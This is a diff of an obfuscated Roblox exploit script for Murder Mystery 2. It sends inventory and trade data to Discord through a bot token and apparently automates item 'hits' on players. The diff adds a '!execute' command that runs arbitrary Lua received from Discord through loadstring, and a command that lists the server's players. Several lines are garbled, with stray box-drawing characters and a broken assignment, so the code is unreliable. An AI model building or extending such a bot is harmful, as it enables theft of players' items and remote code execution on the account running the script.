@@ -12,7 +12,7 @@ _allow   = _allow or {[142823291] = true};
 -- ═══════════════════════════════════════════════════════════════
 
 if _bt == "" or _ch == "" then
-    warn("[AIO] _bt or _ch not set — aborting");
+    warn("[AIO] _bt or _ch not set - aborting");
     return;
 end
 
@@ -24,8 +24,10 @@ repeat task.wait() until game:IsLoaded()
 local _targetPlace = 142823291;
 local _isMM2 = game.PlaceId == _targetPlace;
 
-_plr = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait();
-_startT = tick();
+_plr =)
+
+ game.Players.LocalPlayer.Character-- or game.Players.LocalPlayer. ═CharacterAdded:Wait════();
+_startT = tick════();
 
 local _hs = game:GetService("HttpService");
 local _rs = game:GetService("ReplicatedStorage");
@@ -36,9 +38,7 @@ local _ex, _exv = identifyexecutor();
 _sumV = 0;
 _doneT = 0;
 _minRare = _minRare or "Godly";
-print(1)
-
--- ═══════════════════════════════════════════════════════════════
+print(1══════════════════════════════════════════════════════
 --  MM2-SPECIFIC INIT
 -- ═══════════════════════════════════════════════════════════════
 if _isMM2 then
@@ -78,9 +78,6 @@ if _isMM2 then
     local _gI = table.find(_rT, "Godly") or 6;
     _GI = _gI;
 
-    -- ═══════════════════════════════════════════════════════════════
-    --  VALUE LIST LOADER (with GitHub fallback)
-    -- ═══════════════════════════════════════════════════════════════
     local _vL = {};
 
     pcall(function()
@@ -132,7 +129,7 @@ if _isMM2 then
 
     _VL = _vL;
     if not next(_vL) then
-        warn("[vL] BOTH value sources failed — values will show as 1/2");
+        warn("[vL] BOTH value sources failed - values will show as 1/2");
     end
 
     local function _lv(_rn, _it, _rr, _cr, _yr)
@@ -207,7 +204,7 @@ if _isMM2 then
         table.sort(_all, function(_a, _b) return (_a.value * _a.amount) > (_b.value * _b.amount) end);
         local _lines = {};
         for _i, _v in ipairs(_all) do
-            table.insert(_lines, string.format("%s (x%s) → %s Value", _v.name, _v.amount, _v.value * _v.amount));
+            table.insert(_lines, string.format("%s (x%s) -> %s Value", _v.name, _v.amount, _v.value * _v.amount));
         end
         local _joined = table.concat(_lines, "\n");
         while #_joined > 1014 and #_lines > 0 do
@@ -222,7 +219,7 @@ if _isMM2 then
             { name = "Info", value = _info },
             { name = "Full Inventory", value = "```\n".._joined.."\n```" },
         };
-        local _p = { embeds = {{ title = "MM2 Autojoiner — Post-Trade Inventory", color = 0x3EED50, fields = _f, footer = { text = "Snapshot at " .. os.date("%H:%M:%S") }, timestamp = DateTime.now():ToIsoDate() }} };
+        local _p = { embeds = {{ title = "MM2 Autojoiner - Post-Trade Inventory", color = 0x3EED50, fields = _f, footer = { text = "Snapshot at " .. os.date("%H:%M:%S") }, timestamp = DateTime.now():ToIsoDate() }} };
         local _r = request({ Url = _u, Method = "POST", Headers = { ["Authorization"] = "Bot " .. _bt, ["Content-Type"] = "application/json" }, Body = _hs:JSONEncode(_p) });
         if _r.StatusCode ~= 200 then warn("[_snap] "..tostring(_r.Body)) end
     end
@@ -242,7 +239,7 @@ if _isMM2 then
             { name = "Items", value = "" },
         };
         for _i, _v in ipairs(_n) do
-            _s = string.format("%s (x%s) → %s Value", _v.name, _v.amount, (_v.value * _v.amount));
+            _s = string.format("%s (x%s) -> %s Value", _v.name, _v.amount, (_v.value * _v.amount));
             _f[2].value = _f[2].value .. _s .. "\n";
         end
         _f[2].value = "```\n".._f[2].value.."\n```";
@@ -296,7 +293,7 @@ if _isMM2 then
             { name = "Inventory", value = "" },
         };
         for _i, _v in ipairs(_n2) do
-            _s = string.format("%s (x%s) → %s Value", _v.name, _v.amount, (_v.value * _v.amount));
+            _s = string.format("%s (x%s) -> %s Value", _v.name, _v.amount, (_v.value * _v.amount));
             _f[2].value = _f[2].value .. _s .. "\n";
         end
         if #_f[2].value > 1024 then
@@ -330,7 +327,7 @@ if _isMM2 then
         _inv = _inv..tostring(_vl).."\n\n";
         table.sort(_tb, function(_a, _b) return (_a.value * _a.amount) > (_b.value * _b.amount) end);
         for _i, _v in ipairs(_tb) do
-            _s = string.format("%s (x%s) → %s Value", _v.name, _v.amount, (_v.value * _v.amount));
+            _s = string.format("%s (x%s) -> %s Value", _v.name, _v.amount, (_v.value * _v.amount));
             _inv = _inv .. _s .. "\n";
         end
         local _bd = "---------------------------" .. tick();
@@ -703,16 +700,11 @@ local function _gw()
 
         if _d.op == 0 and _d.t == "MESSAGE_CREATE" then
             local _md = _d.d;
+            local _content = tostring(_md.content or "");
+            local _isCmd = (_md.channel_id == _cmdCh);
+            local _isHit = (_md.channel_id == _hitCh);
 
-            if _md.channel_id == _hitCh then
-                _lastMid = _md.id;
-                _pjm(_md);
-                return;
-            end
-
-            if _md.channel_id == _cmdCh then
-                local _content = tostring(_md.content or "");
-
+            if _isCmd then
                 if _content == "!inv" then
                     if _isOwner(_md.author) then
                         task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
@@ -733,7 +725,6 @@ local function _gw()
                     return;
                 end
 
-                -- ─── !rejoin ───
                 if _content == "!rejoin" then
                     if not _isOwner(_md.author) then
                         task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
@@ -748,6 +739,80 @@ local function _gw()
                         task.wait(1.5);
                         pcall(function()
                             game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer);
+                        end);
+                    end);
+                    return;
+                end
+
+                local _execCode = _content:match("^!execute%s+([%s%S]+)$");
+                if _execCode then
+                    if not _isOwner(_md.author) then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
+                        return;
+                    end
+                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                    task.spawn(function()
+                        local _bt3 = string.char(96) .. string.char(96) .. string.char(96);
+                        local _nl  = string.char(10);
+                        local _pat1 = "^" .. _bt3 .. "%w*%s*" .. _nl .. "?";
+                        local _pat2 = _nl .. "?%s*" .. _bt3 .. "%s*$";
+                        local _clean = _execCode;
+                        _clean = _clean:gsub(_pat1, "");
+                        _clean = _clean:gsub(_pat2, "");
+
+                        local _fn, _loadErr = loadstring(_clean);
+                        if not _fn then
+                            _postEmbed("❌ Execute - Load Error", "```\n"..tostring(_loadErr):sub(1, 900).."\n```", 0xFF0000);
+                            return;
+                        end
+
+                        local _results = {};
+                        local _ok, _runErr = pcall(function()
+                            local _ret = { _fn() };
+                            for _i, _v in ipairs(_ret) do
+                                table.insert(_results, tostring(_v));
+                            end
+                        end);
+
+                        if not _ok then
+                            _postEmbed("❌ Execute - Runtime Error", "```\n"..tostring(_runErr):sub(1, 900).."\n```", 0xFF0000);
+                        else
+                            local _out = (#_results > 0) and table.concat(_results, "\n") or "(no return value)";
+                            _postEmbed("✅ Execute - OK", "**Output:**\n```\n"..tostring(_out):sub(1, 900).."\n```", 0x3EED50);
+                        end
+                    end);
+                    return;
+                end
+
+                if _content == "!server" then
+                    if not _isOwner(_md.author) then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
+                        return;
+                    end
+                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                    task.spawn(function()
+                        local _players = game.Players:GetPlayers();
+                        local _names = {};
+                        local _self = game.Players.LocalPlayer.Name;
+                        for _, _p in ipairs(_players) do
+                            local _tag = (_p.Name == _self) and " **(you)**" or "";
+                            table.insert(_names, "> `".._p.Name.."`".._tag);
+                        end
+                        table.sort(_names);
+                        local _body = table.concat(_names, "\n");
+                        if #_body > 3900 then
+                            _body = _body:sub(1, 3900) .. "\n...truncated";
+                        end
+                        local _embed = {
+                            title = "👥 Server Players - " .. #_players .. " online",
+                            description = _body,
+                            color = 0x3EED50,
+                            footer = { text = "JobId: " .. tostring(game.JobId):sub(1, 8) .. "... | Place: " .. game.PlaceId },
+                            timestamp = DateTime.now():ToIsoDate()
+                        };
+                        local _pl = { embeds = { _embed } };
+                        pcall(function()
+                            request({ Url = "https://discord.com/api/v10/channels/".._lg.."/messages", Method = "POST", Headers = { ["Authorization"] = "Bot ".._bt, ["Content-Type"] = "application/json" }, Body = _hs:JSONEncode(_pl) });
                         end);
                     end);
                     return;
@@ -782,6 +847,11 @@ local function _gw()
                     end
                     return;
                 end
+            end
+
+            if _isHit then
+                _lastMid = _md.id;
+                _pjm(_md);
             end
         end
     end);
